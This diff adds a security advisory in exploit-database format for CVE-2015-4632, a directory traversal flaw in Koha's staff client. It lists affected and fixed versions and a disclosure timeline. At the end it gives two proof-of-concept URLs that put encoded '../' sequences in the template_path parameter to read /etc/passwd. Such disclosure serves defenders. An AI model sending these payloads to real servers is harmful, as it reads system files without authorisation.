@@ -1,0 +1,74 @@
+# Exploit Title: Koha Open Source ILS - Path Traversal in STAFF client
+# Google Dork:
+# Date: 25/06/2015
+# Exploit Author: Raschin Tavakoli, Bernhard Garn, Peter Aufner and Dimitris Simos - Combinatorial Security Testing Group of SBA Research (cst@sba-research.org)
+# Vendor Homepage: koha-community.org
+# Software Link: https://github.com/Koha-Community/Koha
+# Version: 3.20.x <= 3.20.1, 3.18.x <= 3.18.8, 3.16.x <= 3.16.12
+# Tested on: Debian Linux
+# CVE : CVE-2015-4632
+
+
+
+### CVE-2015-4632 ### 
+
+#### Titel: ####
+Directory traversal
+
+#### Type of vulnerability: ####
+File Path Traversal
+
+##### Exploitation vector:
+Injecting into the "template_path" parmeter in /cgi-bin/koha/svc/members/search and /cgi-bin/koha/svc/members/search
+
+##### Attack outcome:
+Read access to arbitrary files on the system
+
+#### Impact: ####
+{low,medium,high,critical}
+high
+
+#### Software/Product name: ####
+Koha
+
+#### Affected versions: ####
+* <= Koha 3.20.1
+* <= Koha 3.18.8 
+* <= Koha 3.16.12
+
+#### Fixed in version: ####
+* version 3.20.1 http://koha-community.org/security-release-koha-3-20-1/,
+* version 3.18.8 http://koha-community.org/security-release-koha-3-18-8/, 
+* version 3.16.12 http://koha-community.org/security-release-koha-3-16-12/
+
+#### Vendor: ####
+http://koha-community.org/ (Open Source)
+
+#### CVE number: ####
+CVE-2015-4632
+
+#### Timeline ####
+* `2015-06-18` identification of vulnerability 
+* `2015-06-18` 1st contact to release maintainer, immediate reply
+* `2015-06-23` new release with fixed vulnerabilities
+
+#### Credits: ####
+RGhanad-Tavakoli@sba-research.org
+---
+Vulnerability Disclosure by Combinatorial Security Testing Group of SBA Research.
+Contact: cst@sba-research.org
+
+#### References:
+http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14408
+http://koha-community.org/security-release-koha-3-20-1/
+http://koha-community.org/security-release-koha-3-18-8/
+http://koha-community.org/security-release-koha-3-16-12/
+
+#### Description: ####
+Multiple directory traversal vulnerabilities allow remote attackers to read arbitrary files via a .. (dot dot) in (1) /cgi-bin/koha/svc/virtualshelves/search and (2) in /cgi-bin/koha/svc/members/search 
+
+#### Proof-of-concept: ####
+/cgi-bin/koha/svc/virtualshelves/search?template_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+
+/cgi-bin/koha/svc/members/search?template_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+
